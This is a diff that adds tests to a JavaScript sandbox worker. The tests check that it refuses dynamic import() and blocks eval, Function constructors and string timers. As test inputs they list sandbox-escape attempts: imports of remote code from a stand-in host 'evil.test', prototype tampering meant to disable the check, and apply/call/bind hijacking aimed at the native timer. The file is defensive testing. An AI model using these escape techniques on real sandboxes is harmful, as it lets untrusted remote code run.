@@ -161,6 +161,123 @@ describe("LiveJS worker protocol (real WORKER_SOURCE in a vm realm)", () => {
   });
 });
 
+/* ─── No import(), no string compilation (open item 11) ───────────────── */
+
+describe("LiveJS worker: no import() and no way to compile one", () => {
+  const refusedImport = async (source: string) => {
+    const { logs, done } = await runRaw(new VmWorker(), source);
+    expect(logs, source).toHaveLength(1);
+    expect(logs[0][0]).toBe("error");
+    expect(logs[0][1]).toContain('contains the word "import"');
+    expect(done.type).toBe("done");
+  };
+
+  it("refuses any source that contains the word import, before compiling it", async () => {
+    for (const source of [
+      'await import("https://evil.test/m.js")',
+      'await import /* c */ ("https://evil.test/m.js")',
+      'await import ("https://evil.test/m.js")',
+      'await import ("https://evil.test/m.js")',
+      'const x = [...import("https://evil.test/m.js").then(() => [])]',
+      'console.log("import")',
+      "// import\nconsole.log(1)",
+      'console.log({ import: 1 })',
+      'import("https://evil.test/m.js")',
+      'await 0; import("https://evil.test/m.js")',
+    ]) {
+      await refusedImport(source);
+    }
+  });
+
+  it("an earlier shared run cannot switch the check off", async () => {
+    const w = new VmWorker();
+    const tamper = [
+      "RegExp.prototype.test = () => false;",
+      "RegExp.prototype.exec = () => null;",
+      "String.prototype.indexOf = () => -1;",
+      "String.prototype.includes = () => false;",
+      'String.prototype[-1] = "a";',
+      "for (let i = 0; i < 200; i++) String.prototype[i] = \"a\";",
+      'globalThis.String = () => "";',
+      'console.log("tampered");',
+    ].join("\n");
+    expect((await runRaw(w, tamper, 1)).logs).toEqual([["log", "tampered"]]);
+    for (const [k, source] of ['import("https://evil.test/a.js")', 'await 0; import("https://evil.test/b.js")'].entries()) {
+      const { logs } = await runRaw(w, source, 2 + k);
+      expect(logs, source).toHaveLength(1);
+      expect(logs[0][1]).toContain('contains the word "import"');
+    }
+  });
+
+  it("does not refuse longer names that only contain import", async () => {
+    const { logs } = await runRaw(new VmWorker(), "const importer = 1, reimport = 2, import_ = 3, $import = 4; console.log(importer + reimport + import_ + $import);");
+    expect(logs).toEqual([["log", "10"]]);
+  });
+
+  it("removes eval, every Function constructor and string timers", async () => {
+    const tries = {
+      eval: 'eval("1")',
+      indirectEval: '(0, eval)("1")',
+      selfEval: 'self.eval("1")',
+      Function: 'Function("return 1")()',
+      newFunction: 'new Function("return 1")()',
+      ctor: '(function () {}).constructor("return 1")()',
+      protoCtor: 'Function.prototype.constructor("return 1")()',
+      asyncCtor: '(async function () {}).constructor("return 1")()',
+      arrowCtor: '(async () => {}).constructor("return 1")()',
+      genCtor: '(function* () {}).constructor("return 1")().next()',
+      asyncGenCtor: '(async function* () {}).constructor("return 1")().next()',
+      reflect: 'Reflect.construct(Object.getPrototypeOf(() => {}).constructor, ["return 1"])()',
+      timeoutString: 'setTimeout("1")',
+    };
+    const source = [
+      "const out = [];",
+      ...Object.entries(tries).map(
+        ([k, expr]) => `try { await (async () => ${expr})(); out.push(${JSON.stringify(k)} + ":ran"); } catch (e) { out.push(${JSON.stringify(k)} + ":" + (e && e.message)); }`,
+      ),
+      'console.log(out.join("|"));',
+    ].join("\n");
+    const { logs } = await runRaw(new VmWorker(), source);
+    const outcome = Object.fromEntries(logs[0][1].split("|").map((s) => s.split(/:(.*)/s).slice(0, 2)));
+    expect(Object.keys(outcome).sort()).toEqual(Object.keys(tries).sort());
+    for (const [k, v] of Object.entries(outcome)) expect(v, k).toContain("does not compile strings");
+  });
+
+  it("a replaced apply/call/bind/Reflect cannot reach the native timer", async () => {
+    const source = [
+      "let leaked = null;",
+      "const keep = { apply: Function.prototype.apply, call: Function.prototype.call, bind: Function.prototype.bind };",
+      "for (const k of ['apply', 'call', 'bind']) Function.prototype[k] = function () { if (this !== keep[k]) leaked = leaked || this; return 1; };",
+      "globalThis.Reflect = { apply(f) { leaked = leaked || f; } };",
+      "setTimeout(() => {}, 0); setTimeout(() => {}, 0, 'x', 'y'); setInterval && clearInterval;",
+      "for (const k of ['apply', 'call', 'bind']) Function.prototype[k] = keep[k];",
+      "let ran = 'not called';",
+      "if (leaked) { try { leaked('1'); ran = 'native timer took a string'; } catch (e) { ran = 'threw'; } }",
+      "console.log(String(ran));",
+    ].join("\n");
+    const { logs } = await runRaw(new VmWorker(), source);
+    expect(logs).toEqual([["log", "not called"]]);
+  });
+
+  it("forwards extra timer arguments", async () => {
+    const { logs } = await runRaw(new VmWorker(), "await new Promise((r) => setTimeout((a, b) => { console.log(a + b); r(); }, 1, 2, 3));");
+    expect(logs).toEqual([["log", "5"]]);
+  });
+
+  it("keeps the rest working: function timers, instanceof Function, call/apply, plain .setTimeout props", async () => {
+    const { logs } = await runRaw(
+      new VmWorker(),
+      [
+        "await new Promise((r) => setTimeout(r, 1));",
+        "const f = function () { return this.v; };",
+        "const o = {}; o.setTimeout = 5; o.eval = 6;",
+        "console.log(f instanceof Function, f.call({ v: 7 }), o.setTimeout + o.eval);",
+      ].join("\n"),
+    );
+    expect(logs).toEqual([["log", "true 7 11"]]);
+  });
+});
+
 /* ─── Scope persistence ───────────────────────────────────────────────── */
 
 describe("LiveJS shared scope persistence", () => {
